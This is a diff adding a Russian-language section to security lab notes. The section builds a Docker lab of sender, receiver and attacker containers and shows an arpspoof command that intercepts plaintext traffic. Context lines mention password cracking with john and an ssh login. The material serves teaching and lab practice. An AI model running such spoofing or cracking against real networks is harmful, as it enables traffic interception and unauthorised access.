@@ -122,3 +122,37 @@ john password
 ssh <USER-NAME>@<HOST-IP>
 password: <password from john’s output>
 ```
+
+### ARP spoofing (по умолчанию возможна! )
+```
+# стенд
+// Dockerfile
+FROM debian:buster
+RUN apt-get update \
+ && apt-get install -y iputils-ping dnsutils net-tools dsniff netcat tcpdump
+
+// docker-compose.yml
+version: '3.2'
+services:
+  receiver:
+    build: "./"
+    command: nc -l -p 80
+    logging:
+      driver: none
+  sender:
+    build: "./"
+    command: bash -c "while true; do echo 'secret message'; sleep 5; done | nc receiver 80"
+    depends_on:
+      - receiver
+  attacker:
+    build: "./"
+    command: tcpdump -A 'tcp'
+    container_name: "attacker"
+    tty: true
+
+# Запуск уязвимого контейнера
+(host)$ docker-compose up --build -d
+
+# Старт атаки
+# docker exec attacker /usr/sbin/arpspoof -r -t sender receiver
+```
